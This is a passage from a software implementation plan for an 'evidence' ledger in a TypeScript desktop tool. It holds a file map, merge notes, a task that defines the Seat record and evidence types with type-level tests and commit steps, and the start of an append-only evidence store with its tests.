- Every Part A task is **neither**: its tests call `host.call` directly or a module alone, and check the wire with `parseClientMessage`. `host.start()` makes the roster's file watch, which starts without error in such a sandbox and is never waited on by these tests.
- Tasks 15, 18 and 22 are **neither**: unit tests, jsdom tests and prose.
- Tasks 16, 17, 19, 20 and 21 are **the rendered UI**: their jsdom tests need neither, but their proof includes `pnpm test:ui-system`, which serves the preview on a local port and drives a browser — Task 17's own spec, `run-check.spec.ts`, among them.
- Task 23 is **the rendered UI** — the real app, launched on the rig's isolated home.
- Prefer `parseClientMessage` for what the wire admits and `host.call` for what the host does: every Part A test uses one or both, and none opens a socket.

---

## File map

| File | Part | Responsibility |
| --- | --- | --- |
| `packages/protocol/src/evidence.ts` (new) | A | The durable types, the standing-order union and `restored` (Task 1); `Freshness` with `final` (Task 3); what a surface draws, stamped (Tasks 7, 8, 10); `CheckUnseen` with the file's generation (Task 11) |
| `packages/protocol/src/index.ts` | A | Exports `evidence.js` |
| `packages/protocol/src/errors.ts` | A | `CheckUnseenError`, `isCheckUnseen` |
| `packages/protocol/src/wire.ts`, `wire-validators.ts` | A | `evidence/seat`, `evidence/checks`, `evidence/board`, `evidence/check/run`; `evidence/changed`; `BackupFile.evidence`, `BackupReport.evidence` |
| `packages/protocol/test/evidence.test.ts` (new) | A | The seam's type test |
| `packages/server/src/evidence/records.ts` (new) | A | The one contextual, bounded rule that reads a stored line; ids; the Seat fold; a fact's key |
| `packages/server/src/evidence/store.ts` (new) | A | The append-only store, one folder per project: durable appends, and `merge` |
| `packages/server/src/evidence/revision.ts` (new) | A | Revision, branch tip, freshness, a branch's diff, a folder's project |
| `packages/server/src/evidence/seats.ts` (new) | A | The Seat book: opening, closing, reading; `flowSeatInput` |
| `packages/server/src/evidence/plane.ts` (new) | A | `EvidencePlane`: what the host holds and methods reach |
| `packages/server/src/evidence/checks-file.ts` (new) | A | `.harnessdesk/checks.yml`, read strictly, as one committed git blob |
| `packages/server/src/evidence/seen.ts` (new) | A | `commands-seen.json` and its sealed key: approvals bound to the repository and the file's generation |
| `packages/server/src/evidence/run.ts` (new) | A | Runs a command in its own group and an environment of its own, and keeps the end of its output |
| `packages/server/src/evidence/board.ts` (new) | A | A board's evidence — restored facts unknown, kept facts first — and `RunningChecks`, one per card |
| `packages/server/src/evidence/check-runs.ts` (new) | A | The gate that runs a named check for a card, and admits a call from its first line |
| `packages/server/src/evidence/forge.ts`, `observe.ts` (new) | A | The pull request and CI read with `gh`; the observer |
| `packages/server/src/methods/evidence.ts` (new), `methods/index.ts`, `methods/context.ts` | A | The four verbs; `HostContext.evidence` |
| `packages/server/src/host.ts` | A | Holds the plane, with the credential cipher for the approvals' key; the registry's restore hook; loads and closes it; the team and flow ports' hooks; `HostOptions.evidence`; the backup |
| `packages/server/src/registry.ts` | A | `SeatedAs.ceiling`; `restoreSeatedAs` |
| `packages/server/src/methods/agents.ts` | A | `agent/seat` writes the Seat record before the seat is kept |
| `packages/server/src/methods/sessions.ts` | A | `session/delete` closes the conversation's Seat |
| `packages/server/src/flows.ts` | A | `FlowPort.recorded`; `FlowPort.run` learns which card |
| `packages/server/src/team.ts` | A | `TeamPort.settled` |
| `packages/server/test/fixtures/evidence-desk.ts` (new) | A | A started host with no listener, a repository open, an Agent on the fake runtime |
| `packages/server/test/evidence-*.test.ts` (new) | A | Each task's tests |
| `packages/server/test/agent-seat.test.ts`, `backup.test.ts` | A | Named edits (Tasks 1, 4, 14) |
| `script/check-reachable.mjs` | A, B | Pins each verb, then unpins it with its first caller |
| `packages/ui/src/state/snapshot.ts`, `store.ts` | B | `boardEvidence`, the newest by stamp; `loadBoardEvidence`, `runCheck`, `seatRecord`, `projectChecks`; `evidence/changed` |
| `packages/ui/src/lib/evidence.ts` (new) | B | Facts in words: chips and the outcome each names, freshness, the dialog's lines |
| `packages/ui/src/lib/board-facts.ts` (new) | B | Where a card belongs, from the facts; a flow's role for its own rounds |
| `packages/ui/src/components/EvidenceChips.tsx` (new) | B | A card's chips, toned by `stateTone`, and *What the desk observed* |
| `packages/ui/src/components/RunCheck.tsx` (new) | B | The first-run question, armed a moment after it opens |
| `packages/ui/src/components/TeamBoardPane.tsx` | B | Chips on cards; the card's menu as the menu pattern, with *Run <check>* and its reasons; the derived columns and *Set aside* |
| `e2e/ui-system/run-check.spec.ts` (new) | B | The first-run question in a real browser: a held Return, the backdrop, a click already on its way (Task 17) |
| `packages/ui/src/components/SeatRecordBlock.tsx` (new), `Details.tsx` | B | A conversation's Seat record at the head of the Agents inspector |
| `packages/ui/src/components/ProjectChecks.tsx` (new), `ProjectPage.tsx` | B | A project's checks |
| `packages/ui/src/lib/backup-words.ts` (new) | A | General › Backup's two sentences, counting evidence (Task 14) |
| `packages/ui/src/components/Settings.tsx` | A | `BackupRows` uses them; its description (Task 14) |
| `packages/ui/src/preview/evidence-fixture.ts` (new) | B | The evidence fixtures the preview and the tests share |
| `packages/ui/src/preview/harness.tsx`, `main.tsx` | B | Fixtures and frames for every new surface; two dialogs on the preview's dial |
| `packages/ui/src/components/TeamBoardPane.test.tsx`, `TeamRoomPane.test.tsx`, `ProjectPage.test.tsx` | B | Named edits and deletions (Tasks 16, 17, 19; 16; 21) |
| `script/shots/seed.mjs`, `shoot.mjs`, `script/shots-isolation.test.mjs` | B | The storefront's check, eight scenes, one gate test (Task 23) |
| `docs/interface.md`, `docs/multi-agent.md`, `docs/data-boundaries.md` | B | What ships |

### Where this plan and phase 2's Part B meet

Phase 2's Part B was not built when this plan was written. These are every file both touch, so they are merged knowingly; this plan is written against phase 2's end state in each.

| File | Phase 2 (task) | Phase 4 (task) | How they meet |
| --- | --- | --- | --- |
| `packages/server/src/registry.ts` | `SeatedAs.seatLabel`, `passedOver` (5), `name` (20) | `SeatedAs.ceiling` (1); `restoreSeatedAs` and the restore in `upsert` (6) | Additions to one interface and one method |
| `packages/server/src/methods/agents.ts` | The `recordAgent` call records `seatLabel`, `passedOver` (5) and `name` (20) | The same call becomes a `seated` literal with `ceiling: null`, written durably first (1, 4) | This plan replaces the call phase 2 left |
| `packages/server/test/agent-seat.test.ts` | Its two `seen.recorded` assertions gain `name` (20) | They gain `ceiling: null` (1); the `rig` gains `evidence` (4) | Named edits, after phase 2's |
| `packages/server/src/host.ts` | Backup (10), `topLevel` (12), `#teamPeers` (20) | The plane, its hooks, and the backup's evidence (4, 5, 6, 8, 12, 13, 14) | Different methods; the backup edits follow Task 10's code |
| `packages/server/src/team.ts` | `TeamPeer.seatedAs`, `#nameOn` (20) | `TeamPort.settled` and its two calls (12) | Different lines |
| `packages/protocol/src/wire.ts` | Backup fields (10), `host/hello`'s `stateDir` (13), the agent verbs | Four evidence verbs, `evidence/changed`, `BackupFile.evidence` (4, 8, 10, 11, 14) | Additions after phase 2's |
| `packages/ui/src/state/snapshot.ts`, `store.ts` | The roster, plans, seats and `startAsAgent` (12–20) | `boardEvidence` and four store methods (15, 17, 20, 21) | Additions |
| `packages/ui/src/components/Settings.tsx` | `BackupRows`' sentences, the `count` helper and the description (11) | Both sentences and `count` move to `lib/backup-words.ts` and count evidence; the description says so (14) | This plan moves and edits the words phase 2's Task 11 wrote |
| `packages/ui/src/components/ProjectPage.tsx` | Created (17) | One section added (21) | An insertion after its Agents section |
| `packages/ui/src/components/ProjectPage.test.tsx` | Created (17) | Its store gains `projectChecks`; one test appended (21) | A named edit to phase 2's test |
| `packages/ui/src/lib/agents.ts` | Created (12, 18) | Read only: `ceilingWords`, `originWords`, `passedWords` (20) | Consumed, never edited |
| `script/shots/seed.mjs`, `shoot.mjs`, `script/shots-isolation.test.mjs` | Staged Agents and ten scenes, with `openStorefront` (22) | The storefront's check, eight scenes, one gate test (23), using phase 2's `openStorefront` and `startAsAgent` | Additions after phase 2's |
| `packages/ui/src/preview/harness.tsx`, `main.tsx` | Roster fixtures and frames (12–20) | Evidence, Seat record and checks fixtures, three frames, two dialogs on the dial (15–21) | Additions |
| `script/check-reachable.mjs` | Unpins the agent verbs (12–19) | Pins and unpins the evidence verbs (4–21) | Different lines |
| `docs/interface.md`, `docs/multi-agent.md` | Agents in the app (21) | Evidence, columns, the Seat record (22) | Different sections |
| `TeamBoardPane.tsx`, `Details.tsx` | Not touched by phase 2 | Chips, *Run <check>*, columns (16, 17, 19); the Seat record (20) | No overlap |

---

# Part A — the host, with no screen

Part A has no screen. Every task in it ends with `pnpm verify` green, and after Task 14 the branch is a pull request of its own.

---

### Task 1: The Seat record's type, and the seam with phase 3

The durable types go in first, because two phases write them. `FlowSeatRecord` (`packages/protocol/src/flow.ts`) is a flow run's working copy of a seat and is discarded with the run; `SeatedAs` (`packages/server/src/registry.ts`) is the in-memory copy phases 1–3 keep for a conversation seated as an Agent. This task defines the record that replaces both as the durable one — and the evidence it will sit beside — and gives `SeatedAs` the one field phase 3 fills, so phase 3 changes a value and never a type. Nothing is written to disk yet.

Records are immutable, so the seam is fixed here, in both of its halves. The ceiling a seat actually ran under is a slot on every record, null until phase 3. And what the Agent's standing order said is a tagged union, `StandingOrder` — `{ kind: 'permission', permission }` in today's words, `{ kind: 'ceiling', level }` in phase 3's — so phase 3 records an Agent that says only `ceiling:` without inventing a `permission:` for it and without changing this type, and a reader always knows which generation it holds. A record also has room to say a backup brought it (`restored`), which Task 14 writes; a record without the mark is one this desk wrote.

**Files:**
- Create: `packages/protocol/src/evidence.ts`
- Modify: `packages/protocol/src/index.ts` (export it)
- Modify: `packages/server/src/registry.ts` (`SeatedAs.ceiling`)
- Modify: `packages/server/src/methods/agents.ts` (`'agent/seat'` records `ceiling: null`)
- Test: `packages/protocol/test/evidence.test.ts` (new); `packages/server/test/agent-seat.test.ts` (two assertions, named below)

**Proof needs:** neither

**Interfaces:**
- Consumes: `AgentId`, `AgentOrigin`, `SeatCandidate` (`agent.ts`); `FlowPermission`, `FlowSeat` (`flow.ts`); `SeatedAs` as phase 2 left it (`agent`, `name`, `briefDigest`, `permission`, `seatLabel`, `passedOver`).
- Produces, in `@harnessdesk/protocol`: `type Sha`, `type SeatId`, `type CeilingLevel`, `interface SeatCeiling`, `type StandingOrder = { kind: 'permission'; permission: FlowPermission } | { kind: 'ceiling'; level: CeilingLevel }`, `interface Restored { at: number }`, `interface SessionPointer`, `interface SeatCheckout`, `interface SeatClosed`, `interface SeatRecord` (with `standing: StandingOrder`, `ceiling: SeatCeiling | null` and `restored?: Restored | null`), `interface CheckRun`, `type Evidence`, `interface CardRef`, `interface EvidenceCheckout`, `interface EvidenceRecord` (with `restored?: Restored | null`) — exact definitions below. In the server: `SeatedAs.ceiling: SeatCeiling | null`. `SeatedAs` keeps phase 2's `permission`: it is the in-memory copy, which phase 3 reshapes freely; only the durable record has to be right the first time.

- [ ] **Step 1: Confirm what phase 2 left**

Run: `grep -n "readonly name: string" packages/server/src/registry.ts && grep -n "name: definition.name," packages/server/src/methods/agents.ts`
Expected: one match in each — `SeatedAs.name` and the `recordAgent` call's `name`, both from phase 2's Task 20. If either is missing, stop: this plan starts after phase 2 has merged.

- [ ] **Step 2: Write the failing tests**

1. Create `packages/protocol/test/evidence.test.ts`:

```ts
import assert from 'node:assert/strict'
import { test } from 'node:test'

import type { SeatRecord } from '../src/index.js'

/*
 * The seam with phase 3, as a type: every Seat record carries the ceiling it
 * ran under and whether it was held, null until phase 3 fills it. Records are
 * immutable and append-only, so the slot exists from the first record on —
 * a field added later would leave every earlier record without it.
 */
test('a Seat record has a ceiling slot in exactly the seam shape, null until phase 3 fills it', () => {
  const none: SeatRecord['ceiling'] = null
  const held: SeatRecord['ceiling'] = { level: 'edit', hold: 'held' }
  // The seam as phase 3's plan spells it. Assigned both ways, so neither side can grow a field alone.
  const seam: { readonly level: 'read' | 'edit' | 'publish' | 'merge'; readonly hold: 'held' | 'asked' } | null = held
  const back: SeatRecord['ceiling'] = seam
  // @ts-expect-error a level that is not on the ladder
  const offLadder: SeatRecord['ceiling'] = { level: 'owner', hold: 'held' }
  // @ts-expect-error a hold that is neither held nor asked
  const unheld: SeatRecord['ceiling'] = { level: 'read', hold: 'enforced' }
  // @ts-expect-error the slot is required: a record without it does not type
  const missing: Pick<SeatRecord, 'ceiling'> = {}
  void [offLadder, unheld, missing]
  assert.deepEqual(JSON.parse(JSON.stringify({ none, back })), { none: null, back: { level: 'edit', hold: 'held' } })
})

/*
 * The other half of the seam: what the Agent's standing order said, in the
 * words of its own generation. Phases 1 and 2 write `permission:`; phase 3's
 * Agents may say only `ceiling:`. A record keeps whichever it was, tagged, so
 * phase 3 writes its Agents' records without inventing a `permission:` for
 * them and without changing this type — and a reader always knows which it
 * holds.
 */
test("a Seat record's standing order is either generation's, tagged, and never both or neither", () => {
  const today: SeatRecord['standing'] = { kind: 'permission', permission: 'read' }
  const phase3: SeatRecord['standing'] = { kind: 'ceiling', level: 'edit' }
  // @ts-expect-error a ceiling-only Agent's order is never written as a permission it did not say
  const invented: SeatRecord['standing'] = { kind: 'permission', level: 'edit' }
  // @ts-expect-error nor a permission as a ceiling
  const mixed: SeatRecord['standing'] = { kind: 'ceiling', permission: 'read' }
  // @ts-expect-error a level off the ceiling's ladder
  const offLadder: SeatRecord['standing'] = { kind: 'ceiling', level: 'owner' }
  // @ts-expect-error the order is required on every record
  const missing: Pick<SeatRecord, 'standing'> = {}
  void [invented, mixed, offLadder, missing]
  const words = (standing: SeatRecord['standing']): string =>
    standing.kind === 'permission' ? `permission: ${standing.permission}` : `ceiling: ${standing.level}`
  assert.deepEqual([words(today), words(phase3)], ['permission: read', 'ceiling: edit'])
})
```

2. In `packages/server/test/agent-seat.test.ts`, the two assertions that pin what a seating records now pin the ceiling slot too. These are the named edits to tests this task was not asked to write:
   - In `the seat is told the narrower of the Agent's ceiling and the seating's grant, in the flow's words, and it is recorded`, the object in the `seen.recorded` assertion — `{ agent: 'reviewer', name: 'Reviewer', briefDigest: digestOf(seen.source), permission: held, seatLabel: 'claude', passedOver: [] }` — gains `, ceiling: null` after `passedOver: []`.
   - In `a seat that runs another effort than asked is closed, and the next candidate the Agent named is seated`, the object in the `seen.recorded` assertion gains `ceiling: null,` after its `passedOver: [ … ],` entry.

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `packages/protocol/test/evidence.test.ts: Module '"../src/index.js"' has no exported member 'SeatRecord'.` (both tests).

- [ ] **Step 4: The types**

Create `packages/protocol/src/evidence.ts`:

```ts
import type { AgentId, AgentOrigin, SeatCandidate } from './agent.js'
import type { FlowPermission, FlowSeat } from './flow.js'

/**
 * The evidence ledger's nouns: what the desk observed, bound to the revision
 * it was true at, and the immutable record of every Seat.
 *
 * Written by the host alone, from something it did — a command it ran, a pull
 * request it read, a diff it computed — never from text an agent typed. Kept
 * under `~/.harnessdesk/evidence/`, one store per project, append-only, and
 * never in the repository. The code calls it `evidence`: `ledger` is the usage
 * ledger's word (`packages/server/src/ledger/`).
 *
 * Every type a record is written in lives here, and each is durable: a record
 * written today is read by every later build. So a field is added nullable and
 * never removed, and a union gains members but never loses one.
 */

/** A commit's full object name: 40 hex characters, or 64 in a SHA-256 repository. */
export type Sha = string

/** A Seat's id: minted by the host once, when a seat is kept, and never reused. */
export type SeatId = string

// ------------------------------------------------------------- the Seat record

/**
 * The ladder a ceiling is written in, narrowest first. Phase 3 reads it from an
 * Agent's `ceiling:`; this phase only records it.
 */
export type CeilingLevel = 'read' | 'edit' | 'publish' | 'merge'

/** A ceiling as one seat ran under it. */
export interface SeatCeiling {
  readonly level: CeilingLevel
  /** `held`: the runtime enforced it. `asked`: it was only asked of the agent. */
  readonly hold: 'held' | 'asked'
}

/**
 * What an Agent's standing order said it may do, in the words of that order's
 * generation — never translated into the other's. Phases 1 and 2 write a
 * `permission:`; phase 3's Agents write a `ceiling:`, and an Agent may carry
 * only that. A record keeps whichever its order said, as it said it, beside
 * the ceiling the seat actually ran under — so neither generation has to
 * invent the other's word, and a reader always knows which it is reading.
 */
export type StandingOrder =
  | { readonly kind: 'permission'; readonly permission: FlowPermission }
  | { readonly kind: 'ceiling'; readonly level: CeilingLevel }

/** When a backup brought a record here, rather than this desk writing it. */
export interface Restored {
  readonly at: number
}

/** The conversation that holds a Seat's prompts and tool calls: a pointer, never a copy. */
export interface SessionPointer {
  readonly runtime: string
  readonly sessionId: string
}

/** Where a Seat worked, as the desk read it when the seat was kept. */
export interface SeatCheckout {
  /** The folder the conversation works in, absolute. */
  readonly cwd: string
  /** The project that folder belongs to: its repository's main checkout, or the folder itself outside one. */
  readonly project: string
  /** The branch checked out then; null on a detached HEAD or outside a repository. */
  readonly branch: string | null
  /** The commit checked out then; null outside a repository or before its first commit. */
  readonly head: Sha | null
}

/** How and when the desk let a Seat go. */
export interface SeatClosed {
  readonly at: number
  /**
   * Why, in one word. This phase writes `deleted` — the conversation was
   * deleted. Later phases add their own (`released`, `wrapped`); a reader that
   * does not know a word still knows the seat is closed.
   */
  readonly why: string
}

/**
 * One Seat, as it was: an Agent (or, for a flow's role, a runtime) working in
 * one checkout on one seat, and the conversation it worked in.
 *
 * Immutable. The opening is written once, when the seat is kept; the closing is
 * a second record written once, when the desk lets it go, and `closed` is read
 * from it. It outlives the conversation it points at and the room it worked in,
 * because *why does this line look like this* is asked long after both are
 * gone.
 */
export interface SeatRecord {
  readonly id: SeatId
  /**
   * The Agent it was seated as, as it was named then; null for a seat a flow
   * opened on a runtime, which is no Agent yet (phase 6 seats Agents in flows).
   */
  readonly agent: { readonly id: AgentId; readonly name: string; readonly origin: AgentOrigin } | null
  /** The content hash of the brief it was handed (`AgentEntry.digest`); null when there was no Agent. */
  readonly briefDigest: string | null
  /** The seat it resolved to, as written: runtime, model, effort. */
  readonly seat: FlowSeat
  /** What it runs, read back when it was kept, in the desk's words: runtime · model · effort. */
  readonly seatLabel: string
  /** Every candidate passed over on the way to this one, as the refusal sheet shows them. */
  readonly passedOver: readonly SeatCandidate[]
  /** What its standing order said it may do, as the order said it: today's `permission:`, or phase 3's `ceiling:`. */
  readonly standing: StandingOrder
  /** The ceiling this seat actually ran under, and whether the runtime held it or it was only asked of the agent. Null until phase 3. */
  readonly ceiling: SeatCeiling | null
  readonly checkout: SeatCheckout
  readonly session: SessionPointer
  /** The board it was seated to work on — a room's id, which phase 5 keeps as its Goal's; null for a conversation seated on its own. */
  readonly board: string | null
  /** The role it holds on that board, when a flow seated it. */
  readonly role: string | null
  readonly openedAt: number
  /** Null while the seat is open. */
  readonly closed: SeatClosed | null
  /**
   * Set when a backup brought this record here; absent or null for a Seat this
   * desk kept. A restored Seat is history — drawn, and carried by the next
   * backup — and never says which Agent a conversation on this desk is.
   */
  readonly restored?: Restored | null
}

// ------------------------------------------------------------------ evidence

/** One check a forge ran on a revision, as it reported it. */
export interface CheckRun {
  readonly name: string
  readonly state: 'pending' | 'passed' | 'failed' | 'skipped' | 'cancelled'
  readonly url: string | null
}

/**
 * A fact the desk observed, bound to the revision it was true at.
 *
 * This phase produces `check`, `diff`, `pr` and `ci`; `review`, `finding` and
 * `spend` are the spec's, written by later phases, and are here so that no
 * record a later phase writes needs this type changed.
 */
export type Evidence =
  | {
      readonly kind: 'check'
      /** The check's name, and its command as it ran: a renamed check can never pass for the old one. */
      readonly name: string
      readonly run: string
      /** Its exit status; null when it did not exit by itself — it ran over its time, or never started. */
      readonly exit: number | null
      readonly timedOut: boolean
      readonly at: Sha
      /** True when the checkout held changes not committed: the result is about no commit at all. */
      readonly dirty: boolean
      /** The last of what it printed, so a failure can say why. At most 4,000 characters. */
      readonly tail: string
    }
  | { readonly kind: 'ci'; readonly checks: readonly CheckRun[]; readonly at: Sha }
  | {
      readonly kind: 'review'
      readonly verdict: string
      readonly by: SeatId
      readonly at: Sha
      /** What it was judged against — a requirement's revision, a base. */
      readonly against?: readonly Sha[]
    }
  | {
      readonly kind: 'pr'
      readonly number: number
      readonly head: Sha
      readonly state: 'open' | 'merged' | 'closed'
      readonly url: string | null
    }
  | {
      readonly kind: 'diff'
      readonly files: number
      readonly added: number
      readonly removed: number
      readonly from: Sha
      readonly to: Sha
    }
  | { readonly kind: 'finding'; readonly id: string; readonly state: 'open' | 'repaired' | 'withdrawn'; readonly at: Sha }
  | {
      readonly kind: 'spend'
      readonly usd: number
      readonly turns: number
      /** False when a count is a stream floor rather than a settled total. */
      readonly exact: boolean
    }

/** A card on a board: the board's id — a room's, which phase 5 keeps as its Goal's — and the card's number on it. */
export interface CardRef {
  readonly board: string
  readonly id: number
}

/** Where a fact was observed, so its staleness is read against the branch it was about. */
export interface EvidenceCheckout {
  readonly cwd: string
  /** Null when HEAD was detached: then HEAD itself is what later commits are counted on. */
  readonly branch: string | null
}

export interface EvidenceRecord {
  /** Minted by the host when the record is written; how a restore knows it already has one. */
  readonly id: string
  readonly fact: Evidence
  /** The card it was observed for; absent for a fact about no card. */
  readonly card?: CardRef | null
  readonly checkout?: EvidenceCheckout | null
  /** The Seat that produced it; absent when the desk observed it unattended. */
  readonly seat?: SeatId | null
  /** The round it belongs to. Evidence publishes when its ROUND closes. */
  readonly round?: number | null
  readonly observedAt: number
  /** Where it was published, so a reply threads under it and a re-review sees the thread. */
  readonly posted?: { readonly pr: number; readonly comment: number } | null
  /**
   * Set when a backup brought this fact here; absent or null for one this desk
   * observed. A restored fact is history: it stands as unknown until the desk
   * observes the same question again, and it never puts a card in *Ready*.
   */
  readonly restored?: Restored | null
}
```

In `packages/protocol/src/index.ts`, add after `export * from './flow.js'`:

```ts
export * from './evidence.js'
```

- [ ] **Step 5: The slot on the in-memory copy, and the one value phase 3 changes**

1. In `packages/server/src/registry.ts`, add `type SeatCeiling,` to the import from `@harnessdesk/protocol`, after `type SeatCandidate,`, and add to `interface SeatedAs`, after `readonly passedOver: readonly SeatCandidate[]`:

```ts
  /**
   * The ceiling this seat actually runs under, and whether the runtime holds it
   * or it was only asked of the agent — the seam with phase 3, which fills it.
   * Null until then. Not laid over the conversation's settings here: which
   * surface draws it, and how, is phase 3's.
   */
  readonly ceiling: SeatCeiling | null
```

2. In `packages/server/src/methods/agents.ts`, add `import type { SeatedAs } from '../registry.js'` after `import type { OpenedSeat } from '../host.js'`, and in `'agent/seat'` replace the `return ctx.seats.recordAgent(opened.runtime, opened.sessionId, { … })` call — the one phase 2 left, recording `agent`, `name`, `briefDigest`, `permission`, `seatLabel` and `passedOver` — with:

```ts
      /* `ceiling` is the one value phase 3 changes here: the ceiling this seat
         actually runs under, and whether the runtime holds it. Null until then,
         on the record the host keeps and on the durable one alike. */
      const seated: SeatedAs = {
        agent: definition.id,
        name: definition.name,
        briefDigest: digest,
        permission,
        seatLabel: opened.label,
        passedOver: said(passed),
        ceiling: null,
      }
      return ctx.seats.recordAgent(opened.runtime, opened.sessionId, seated)
```

- [ ] **Step 6: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/protocol/dist/test/evidence.test.js packages/server/dist/test/agent-seat.test.js packages/server/dist/test/registry.test.js`
Expected: PASS — `evidence.test.js` 2 tests; `agent-seat.test.js` and `registry.test.js` with no failures, the two edited assertions among them.

- [ ] **Step 7: Prove each test can fail**

1. Delete `ceiling: null,` from the `seated` literal (and `readonly ceiling` from `SeatedAs`, so it compiles): `node --test packages/server/dist/test/agent-seat.test.js` fails the two named tests on the missing `ceiling`. Restore both.
2. Make the slot optional — `readonly ceiling?: SeatCeiling | null` in `evidence.ts`: `pnpm run build:node` fails with `Unused '@ts-expect-error' directive` at the `missing` line. Restore it.
3. Flatten the standing order — `readonly standing: { readonly kind: 'permission' | 'ceiling'; readonly permission?: FlowPermission; readonly level?: CeilingLevel }`: the build fails with `Unused '@ts-expect-error' directive` at the `invented` and `mixed` lines, which a flat shape cannot refuse. Restore it.

- [ ] **Step 8: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/protocol/src/evidence.ts packages/protocol/src/index.ts packages/protocol/test/evidence.test.ts packages/server/src/registry.ts packages/server/src/methods/agents.ts packages/server/test/agent-seat.test.ts
git commit -m "feat(evidence): the Seat record's type, with the ceiling slot phase 3 fills

The durable record of a Seat and of what the desk observes, in one protocol
file: a Seat's Agent, brief digest, seat as read back, standing order,
checkout, session pointer, board and role, opened and closed; and the seven
kinds of fact, of which this phase writes four. Records are append-only, so
the seam with phase 3 is fixed from the first record: the ceiling a seat
actually ran under, null until phase 3 fills it, and the standing order as a
tagged union of today's permission: and phase 3's ceiling:, so a ceiling-only
Agent's record never has to invent the other. SeatedAs carries the ceiling
slot, and agent/seat records it as null.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 2: The evidence store

One folder per project under `~/.harnessdesk/evidence/`, named for the project and a hash of its path, never inside the project. Two append-only files in each — `seats.ndjson` for every Seat's opening and closing, `evidence.ndjson` for every fact — so a launch reads every Seat without reading every fact. Nothing in the store can change or remove a line.

**One reading rule.** `lineOf(value, where)` reads a line *where it is*: which of the two files, and whose project. A Seat's line in the facts file, a fact in the Seats file, or a Seat opening whose checkout belongs to another project is no line at all — so the store never reads, and a backup never exports, a line a restore would refuse (Task 14 reads through the same rule). It is bounded too: a line over `LINE_LIMIT` (64 KiB), a check's tail over `TAIL_LIMIT` (4,000 characters), a command, a string, an id, or a list past its limit is not a record this build reads.

**What an append promises.** Appends through one store are queued. Each line is one `write` to a file opened for appending, so two writers on one folder put their lines in either order but never inside each other's; a line a crash cut short is ended before the next is written; and an append resolves only after the file is synced. A write that fails rejects its caller and is reported again by the next `flush()`, so the desk's quit says what was lost. `merge` reads a file, judges each incoming line against it, and appends what it admits as **one** queued step — a restore's read-then-append (Task 14), which cannot race another restore or a normal write. The host holds the only store on its state directory; a second store on the same folder is safe to write through, by the promise above, but only one queue orders its reads against its writes. What `sync` adds — surviving the machine, not only the process — no test here can observe; the subprocess test proves the rest.

**Files:**
- Create: `packages/server/src/evidence/records.ts`, `packages/server/src/evidence/store.ts`
- Test: `packages/server/test/evidence-store.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: the types from Task 1; `errnoOf`, `NOTHING_YET` (`packages/server/src/errno.ts`).
- Produces:
  - From `records.ts`: `LINE_VERSION = 1`; `type StoreFile = 'seats' | 'evidence'`; `interface LineWhere { file: StoreFile; project: string }`; `LINE_LIMIT = 64 * 1024`; `TAIL_LIMIT = 4_000`; `type SeatOpening = Omit<SeatRecord, 'closed'>`; `interface SeatClosing { seat; at; why }`; `type StoredLine = { type: 'seat'; record: SeatOpening } | { type: 'seat-closed'; closing: SeatClosing } | { type: 'evidence'; record: EvidenceRecord }`; `mintId(): string`; `isSha(value: unknown): value is string`; `seatOpeningOf`, `seatClosingOf`, `factOf`, `evidenceRecordOf` (each `(value: unknown) => T | null`); `lineOf(value: unknown, where: LineWhere): StoredLine | null`; `lineText(line: StoredLine): string`; `idOfLine(line: StoredLine): string`; `foldSeats(lines: readonly StoredLine[]): SeatRecord[]`; `factKey(fact: Evidence): string`.
  - From `store.ts`: `type StoreFile` (re-exported); `interface StoreRead { lines: readonly StoredLine[]; skipped: number }`; `interface MergeCount { added; duplicate; refused }`; `type Admit = (line, here, added) => 'add' | 'duplicate' | 'refused'`; `class EvidenceStore { constructor(dir: string, log?: (message, details) => void); folderOf(project: string): string; append(project: string, file: StoreFile, lines: readonly StoredLine[]): Promise<void>; merge(project: string, file: StoreFile, incoming: readonly StoredLine[], admit: Admit): Promise<MergeCount>; read(project: string, file: StoreFile): Promise<StoreRead>; projects(): Promise<string[]>; flush(): Promise<void> }`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-store.test.ts`:

```ts
import assert from 'node:assert/strict'
import { spawn } from 'node:child_process'
import { appendFile, readdir, readFile, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import type { Evidence, EvidenceRecord } from '@harnessdesk/protocol'

import { foldSeats, LINE_LIMIT, lineOf, TAIL_LIMIT, type SeatOpening, type StoredLine } from '../src/evidence/records.js'
import { EvidenceStore, type Admit } from '../src/evidence/store.js'
import { tempDir } from './scratch.js'

/*
 * The evidence store: append-only, one folder per project, never inside the
 * project, durable when an append answers, and read through the one
 * contextual, bounded rule a restore uses too (`lineOf`).
 */

const A = 'a'.repeat(40)
const SEATS = { file: 'seats', project: '/work/repo' } as const
const FACTS = { file: 'evidence', project: '/work/repo' } as const

const opening = (over: Partial<SeatOpening> = {}): SeatOpening => ({
  id: 'seat-1',
  agent: { id: 'reviewer', name: 'Reviewer', origin: 'user' },
  briefDigest: 'digest-1',
  seat: { runtime: 'fake' },
  seatLabel: 'Fake Runtime',
  passedOver: [],
  standing: { kind: 'permission', permission: 'read' },
  ceiling: null,
  checkout: { cwd: '/work/repo', project: '/work/repo', branch: 'main', head: A },
  session: { runtime: 'fake', sessionId: 'fake-session-1' },
  board: null,
  role: null,
  openedAt: 1,
  ...over,
})

type CheckFact = Extract<Evidence, { kind: 'check' }>

const check = (over: Partial<CheckFact> = {}): CheckFact => ({
  kind: 'check',
  name: 'verify',
  run: 'pnpm verify',
  exit: 0,
  timedOut: false,
  at: A,
  dirty: false,
  tail: '',
  ...over,
})

const checkFact = (over: Partial<EvidenceRecord> = {}): EvidenceRecord => ({
  id: 'fact-1',
  fact: check(),
  card: { board: 'room-1', id: 3 },
  checkout: { cwd: '/work/repo', branch: 'main' },
  seat: null,
  round: null,
  observedAt: 2,
  posted: null,
  ...over,
})

const seatLine = (over: Partial<SeatOpening> = {}): StoredLine => ({ type: 'seat', record: opening(over) })
const factLine = (over: Partial<EvidenceRecord> = {}): StoredLine => ({ type: 'evidence', record: checkFact(over) })
